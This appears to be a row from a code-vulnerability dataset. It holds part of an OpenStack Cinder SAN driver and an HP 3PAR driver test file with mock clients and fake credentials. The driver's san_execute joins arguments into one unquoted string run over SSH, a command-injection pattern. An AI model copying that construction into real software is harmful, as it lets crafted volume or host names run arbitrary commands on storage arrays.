    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """"""

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="""",
                        stderr=""Error running SSH command"",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running SSH command: %s"") % command)

    def ensure_export(self, context, volume):
        """"""Synchronously recreates an export for a logical volume.""""""
        pass

    def create_export(self, context, volume):
        """"""Exports the volume.""""""
        pass

    def remove_export(self, context, volume):
        """"""Removes an export for a logical volume.""""""
        pass

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_(""san_ip must be set""))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return ""%s%s"" % (self.configuration.iscsi_target_prefix,
                         volume['name'])
/n/n/n",1
64,64,c55589b131828f3a595903f6796cb2d0babb772f,"cinder/tests/test_hp3par.py/n/n#!/usr/bin/env python
# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Unit tests for OpenStack Cinder volume drivers
""""""
import ast
import mox
import shutil
import tempfile

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers.san.hp import hp_3par_fc as hpfcdriver
from cinder.volume.drivers.san.hp import hp_3par_iscsi as hpdriver

LOG = logging.getLogger(__name__)

HP3PAR_DOMAIN = 'OpenStack',
HP3PAR_CPG = 'OpenStackCPG',
HP3PAR_CPG_SNAP = 'OpenStackCPGSnap'
CLI_CR = '\r\n'


class FakeHP3ParClient(object):

    api_url = None
    debug = False

    volumes = []
    hosts = []
    vluns = []
    cpgs = [
        {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 8192},
         'SAUsage': {'rawTotalMiB': 24576,
                     'rawUsedMiB': 768,
                     'totalMiB': 8192,
                     'usedMiB': 256},
         'SDGrowth': {'LDLayout': {'RAIDType': 4,
                      'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 32768},
         'SDUsage': {'rawTotalMiB': 49152,
                     'rawUsedMiB': 1023,
                     'totalMiB': 36864,
                     'usedMiB': 768},
         'UsrUsage': {'rawTotalMiB': 57344,
                      'rawUsedMiB': 43349,
                      'totalMiB': 43008,
                      'usedMiB': 32512},
         'additionalStates': [],
         'degradedStates': [],
         'domain': HP3PAR_DOMAIN,
         'failedStates': [],
         'id': 5,
         'name': HP3PAR_CPG,
         'numFPVVs': 2,
         'numTPVVs': 0,
         'state': 1,
         'uuid': '29c214aa-62b9-41c8-b198-543f6cf24edf'}]

    def __init__(self, api_url):
        self.api_url = api_url
        self.volumes = []
        self.hosts = []
        self.vluns = []

    def debug_rest(self, flag):
        self.debug = flag

    def login(self, username, password, optional=None):
        return None

    def logout(self):
        return None

    def getVolumes(self):
        return self.volumes

    def getVolume(self, name):
        if self.volumes:
            for volume in self.volumes:
                if volume['name'] == name:
                    return volume

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VOLUME '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def createVolume(self, name, cpgName, sizeMiB, optional=None):
        new_vol = {'additionalStates': [],
                   'adminSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 384,
                                  'reservedMiB': 128,
                                  'usedMiB': 128},
                   'baseId': 115,
                   'comment': optional['comment'],
                   'copyType': 1,
                   'creationTime8601': '2012-10-22T16:37:57-07:00',
                   'creationTimeSec': 1350949077,
                   'degradedStates': [],
                   'domain': HP3PAR_DOMAIN,
                   'failedStates': [],
                   'id': 115,
                   'name': name,
                   'policies': {'caching': True,
                                'oneHost': False,
                                'staleSS': True,
                                'system': False,
                                'zeroDetect': False},
                   'provisioningType': 1,
                   'readOnly': False,
                   'sizeMiB': sizeMiB,
                   'snapCPG': optional['snapCPG'],
                   'snapshotSpace': {'freeMiB': 0,
                                     'rawReservedMiB': 683,
                                     'reservedMiB': 512,
                                     'usedMiB': 512},
                   'ssSpcAllocLimitPct': 0,
                   'ssSpcAllocWarningPct': 0,
                   'state': 1,
                   'userCPG': cpgName,
                   'userSpace': {'freeMiB': 0,
                                 'rawReservedMiB': 41984,
                                 'reservedMiB': 31488,
                                 'usedMiB': 31488},
                   'usrSpcAllocLimitPct': 0,
                   'usrSpcAllocWarningPct': 0,
                   'uuid': '1e7daee4-49f4-4d07-9ab8-2b6a4319e243',
                   'wwn': '50002AC00073383D'}
        self.volumes.append(new_vol)
        return None

    def deleteVolume(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createSnapshot(self, name, copyOfName, optional=None):
        new_snap = {'additionalStates': [],
                    'adminSpace': {'freeMiB': 0,
                                   'rawReservedMiB': 0,
                                   'reservedMiB': 0,
                                   'usedMiB': 0},
                    'baseId': 342,
                    'comment': optional['comment'],
                    'copyOf': copyOfName,
                    'copyType': 3,
                    'creationTime8601': '2012-11-09T15:13:28-08:00',
                    'creationTimeSec': 1352502808,
                    'degradedStates': [],
                    'domain': HP3PAR_DOMAIN,
                    'expirationTime8601': '2012-11-09T17:13:28-08:00',
                    'expirationTimeSec': 1352510008,
                    'failedStates': [],
                    'id': 343,
                    'name': name,
                    'parentId': 342,
                    'policies': {'caching': True,
                                 'oneHost': False,
                                 'staleSS': True,
                                 'system': False,
                                 'zeroDetect': False},
                    'provisioningType': 3,
                    'readOnly': True,
                    'retentionTime8601': '2012-11-09T16:13:27-08:00',
                    'retentionTimeSec': 1352506407,
                    'sizeMiB': 256,
                    'snapCPG': HP3PAR_CPG_SNAP,
                    'snapshotSpace': {'freeMiB': 0,
                                      'rawReservedMiB': 0,
                                      'reservedMiB': 0,
                                      'usedMiB': 0},
                    'ssSpcAllocLimitPct': 0,
                    'ssSpcAllocWarningPct': 0,
                    'state': 1,
                    'userCPG': HP3PAR_CPG,
                    'userSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 0,
                                  'reservedMiB': 0,
                                  'usedMiB': 0},
                    'usrSpcAllocLimitPct': 0,
                    'usrSpcAllocWarningPct': 0,
                    'uuid': 'd7a40b8f-2511-46a8-9e75-06383c826d19',
                    'wwn': '50002AC00157383D'}
        self.volumes.append(new_snap)
        return None

    def deleteSnapshot(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createCPG(self, name, optional=None):
        cpg = {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 8192},
               'SAUsage': {'rawTotalMiB': 24576,
                           'rawUsedMiB': 768,
                           'totalMiB': 8192,
                           'usedMiB': 256},
               'SDGrowth': {'LDLayout': {'RAIDType': 4,
                            'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 32768},
               'SDUsage': {'rawTotalMiB': 49152,
                           'rawUsedMiB': 1023,
                           'totalMiB': 36864,
                           'usedMiB': 768},
               'UsrUsage': {'rawTotalMiB': 57344,
                            'rawUsedMiB': 43349,
                            'totalMiB': 43008,
                            'usedMiB': 32512},
               'additionalStates': [],
               'degradedStates': [],
               'domain': HP3PAR_DOMAIN,
               'failedStates': [],
               'id': 1,
               'name': name,
               'numFPVVs': 2,
               'numTPVVs': 0,
               'state': 1,
               'uuid': '29c214aa-62b9-41c8-b198-000000000000'}

        new_cpg = cpg.copy()
        new_cpg.update(optional)
        self.cpgs.append(new_cpg)

    def getCPGs(self):
        return self.cpgs

    def getCPG(self, name):
        if self.cpgs:
            for cpg in self.cpgs:
                if cpg['name'] == name:
                    return cpg

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""CPG '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def deleteCPG(self, name):
        cpg = self.getCPG(name)
        self.cpgs.remove(cpg)

    def createVLUN(self, volumeName, lun, hostname=None,
                   portPos=None, noVcn=None,
                   overrideLowerPriority=None):

        vlun = {'active': False,
                'failedPathInterval': 0,
                'failedPathPol': 1,
                'hostname': hostname,
                'lun': lun,
                'multipathing': 1,
                'portPos': portPos,
                'type': 4,
                'volumeName': volumeName,
                'volumeWWN': '50002AC00077383D'}
        self.vluns.append(vlun)
        return None

    def deleteVLUN(self, name, lunID, hostname=None, port=None):
        vlun = self.getVLUN(name)
        self.vluns.remove(vlun)

    def getVLUNs(self):
        return self.vluns

    def getVLUN(self, volumeName):
        for vlun in self.vluns:
            if vlun['volumeName'] == volumeName:
                return vlun

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VLUN '%s' was not found"" % volumeName}
        raise hpexceptions.HTTPNotFound(msg)


class HP3PARBaseDriver():

    VOLUME_ID = ""d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    CLONE_ID = ""d03338a9-9115-48a3-8dfc-000000000000""
    VOLUME_NAME = ""volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    SNAPSHOT_ID = ""2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    SNAPSHOT_NAME = ""snapshot-2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    VOLUME_3PAR_NAME = ""osv-0DM4qZEVSKON-DXN-NwVpw""
    SNAPSHOT_3PAR_NAME = ""oss-L4I73ONuTci9Fd4ceij-MQ""
    FAKE_HOST = ""fakehost""
    USER_ID = '2689d9a913974c008b1d859013f23607'
    PROJECT_ID = 'fac88235b9d64685a3530f73e490348f'
    VOLUME_ID_SNAP = '761fc5e5-5191-4ec7-aeba-33e36de44156'
    FAKE_DESC = 'test description name'
    FAKE_FC_PORTS = ['0987654321234', '123456789000987']
    QOS = {'qos:maxIOPS': '1000', 'qos:maxBWS': '50'}
    VVS_NAME = ""myvvs""
    FAKE_ISCSI_PORTS = {'1.1.1.2': {'nsp': '8:1:1',
                                    'iqn': ('iqn.2000-05.com.3pardata:'
                                            '21810002ac00383d'),
                                    'ip_port': '3262'}}

    volume = {'name': VOLUME_NAME,
              'id': VOLUME_ID,
              'display_name': 'Foo Volume',
              'size': 2,
              'host': FAKE_HOST,
              'volume_type': None,
              'volume_type_id': None}

    volume_qos = {'name': VOLUME_NAME,
                  'id': VOLUME_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': FAKE_HOST,
                  'volume_type': None,
                  'volume_type_id': 'gold'}

    snapshot = {'name': SNAPSHOT_NAME,
                'id': SNAPSHOT_ID,
                'user_id': USER_ID,
                'project_id': PROJECT_ID,
                'volume_id': VOLUME_ID_SNAP,
                'volume_name': VOLUME_NAME,
                'status': 'creating',
                'progress': '0%',
                'volume_size': 2,
                'display_name': 'fakesnap',
                'display_description': FAKE_DESC}

    connector = {'ip': '10.0.0.2',
                 'initiator': 'iqn.1993-08.org.debian:01:222',
                 'wwpns': [""123456789012345"", ""123456789054321""],
                 'wwnns': [""223456789012345"", ""223456789054321""],
                 'host': 'fakehost'}

    volume_type = {'name': 'gold',
                   'deleted': False,
                   'updated_at': None,
                   'extra_specs': {'qos:maxBWS': '50',
                                   'qos:maxIOPS': '1000'},
                   'deleted_at': None,
                   'id': 'gold'}

    def setup_configuration(self):
        configuration = mox.MockObject(conf.Configuration)
        configuration.hp3par_debug = False
        configuration.hp3par_username = 'testUser'
        configuration.hp3par_password = 'testPassword'
        configuration.hp3par_api_url = 'https://1.1.1.1/api/v1'
        configuration.hp3par_domain = HP3PAR_DOMAIN
        configuration.hp3par_cpg = HP3PAR_CPG
        configuration.hp3par_cpg_snap = HP3PAR_CPG_SNAP
        configuration.iscsi_ip_address = '1.1.1.2'
        configuration.iscsi_port = '1234'
        configuration.san_ip = '2.2.2.2'
        configuration.san_login = 'test'
        configuration.san_password = 'test'
        configuration.hp3par_snapshot_expiration = """"
        configuration.hp3par_snapshot_retention = """"
        configuration.hp3par_iscsi_ips = []
        return configuration

    def setup_fakes(self):
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_3par_host"",
                       self.fake_get_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_delete_3par_host"",
                       self.fake_delete_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_3par_vlun"",
                       self.fake_create_3par_vlun)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                       self.fake_get_ports)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)

    def clear_mox(self):
        self.mox.ResetAll()
        self.stubs.UnsetAll()

    def fake_create_client(self):
        return FakeHP3ParClient(self.driver.configuration.hp3par_api_url)

    def fake_get_cpg(self, volume, allowSnap=False):
        return HP3PAR_CPG

    def fake_set_connections(self):
        return

    def fake_get_domain(self, cpg):
        return HP3PAR_DOMAIN

    def fake_extend_volume(self, volume, new_size):
        vol = self.driver.common.client.getVolume(volume['name'])
        old_size = vol['sizeMiB']
        option = {'comment': vol['comment'], 'snapCPG': vol['snapCPG']}
        self.driver.common.client.deleteVolume(volume['name'])
        self.driver.common.client.createVolume(vol['name'],
                                               vol['userCPG'],
                                               new_size, option)

    def fake_get_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            return self._hosts[hostname]

    def fake_delete_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            del self._hosts[hostname]

    def fake_create_3par_vlun(self, volume, hostname):
        self.driver.common.client.createVLUN(volume, 19, hostname)

    def fake_get_ports(self):
        return {'FC': self.FAKE_FC_PORTS, 'iSCSI': self.FAKE_ISCSI_PORTS}

    def fake_get_volume_type(self, type_id):
        return self.volume_type

    def fake_get_qos_by_volume_type(self, volume_type):
        return self.QOS

    def fake_add_volume_to_volume_set(self, volume, volume_name,
                                      cpg, vvs_name, qos):
        return volume

    def fake_copy_volume(self, src_name, dest_name, cpg=None,
                         snap_cpg=None, tpvv=True):
        pass

    def fake_get_volume_stats(self, vol_name):
        return ""normal""

    def fake_get_volume_settings_from_type(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': self.VVS_NAME,
                'qos': self.QOS,
                'tpvv': True,
                'volume_type': self.volume_type}

    def fake_get_volume_settings_from_type_noqos(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': None,
                'qos': None,
                'tpvv': True,
                'volume_type': None}

    def test_create_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type_noqos)
        self.driver.create_volume(self.volume)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)

    def test_create_volume_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume(self.volume_qos)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)

        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(volume['comment'])))

    def test_delete_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.driver.delete_volume(self.volume)
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.VOLUME_ID)

    def test_create_cloned_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_copy_volume"",
                       self.fake_copy_volume)
        volume = {'name': HP3PARBaseDriver.VOLUME_NAME,
                  'id': HP3PARBaseDriver.CLONE_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': HP3PARBaseDriver.FAKE_HOST,
                  'source_volid': HP3PARBaseDriver.VOLUME_ID}
        src_vref = {}
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertTrue(model_update is not None)

    def test_create_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_snapshot(self.snapshot)

        # check to see if the snapshot was created
        snap_vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.SNAPSHOT_3PAR_NAME)

    def test_delete_snapshot(self):
        self.flags(lock_path=self.tempdir)

        self.driver.create_snapshot(self.snapshot)
        #make sure it exists first
        vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(vol['name'], self.SNAPSHOT_3PAR_NAME)
        self.driver.delete_snapshot(self.snapshot)

        # the snapshot should be deleted now
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.SNAPSHOT_3PAR_NAME)

    def test_create_volume_from_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_volume_from_snapshot(self.volume, self.snapshot)

        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_create_volume_from_snapshot_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_volume_type"",
                       self.fake_get_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_get_qos_by_volume_type"",
                       self.fake_get_qos_by_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume_from_snapshot(self.volume_qos, self.snapshot)
        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(snap_vol['comment'])))

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_terminate_connection(self):
        self.flags(lock_path=self.tempdir)
        #setup the connections
        self.driver.initialize_connection(self.volume, self.connector)
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)
        self.assertEqual(vlun['volumeName'], self.VOLUME_3PAR_NAME)
        self.driver.terminate_connection(self.volume, self.connector,
                                         force=True)
        # vlun should be gone.
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVLUN,
                          self.VOLUME_3PAR_NAME)

    def test_extend_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.UnsetAll()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""extend_volume"",
                       self.fake_extend_volume)
        option = {'comment': '', 'snapCPG': HP3PAR_CPG_SNAP}
        self.driver.common.client.createVolume(self.volume['name'],
                                               HP3PAR_CPG,
                                               self.volume['size'],
                                               option)
        old_size = self.volume['size']
        volume = self.driver.common.client.getVolume(self.volume['name'])
        self.driver.extend_volume(volume, str(old_size + 1))
        vol = self.driver.common.client.getVolume(self.volume['name'])
        self.assertEqual(vol['sizeMiB'], str(old_size + 1))


class TestHP3PARFCDriver(HP3PARBaseDriver, test.TestCase):

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARFCDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARFCDriver, self).setup_fakes()
        self.stubs.Set(hpfcdriver.HP3PARFCDriver,
                       ""_create_3par_fibrechan_host"",
                       self.fake_create_3par_fibrechan_host)

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        super(TestHP3PARFCDriver, self).tearDown()

    def setup_driver(self, configuration):
        self.driver = hpfcdriver.HP3PARFCDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_fibrechan_host(self, hostname, wwn,
                                        domain, persona_id):
        host = {'FCPaths': [{'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 1,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[0]},
                            {'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 0,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[1]}],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'fibre_channel'}
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'fibre_channel')

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        create_host_ret = pack(CLI_CR +
                               'already used by host fakehost.foo (19)')
        _run_ssh(create_host_cmd, False).AndReturn([create_host_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(FC_SHOWHOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(NO_FC_HOST_RET), ''])

        create_host_cmd = ['createhost', '-add', 'fakehost', '123456789012345',
                           '123456789054321']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)


class TestHP3PARISCSIDriver(HP3PARBaseDriver, test.TestCase):

    TARGET_IQN = ""iqn.2000-05.com.3pardata:21810002ac00383d""

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARISCSIDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

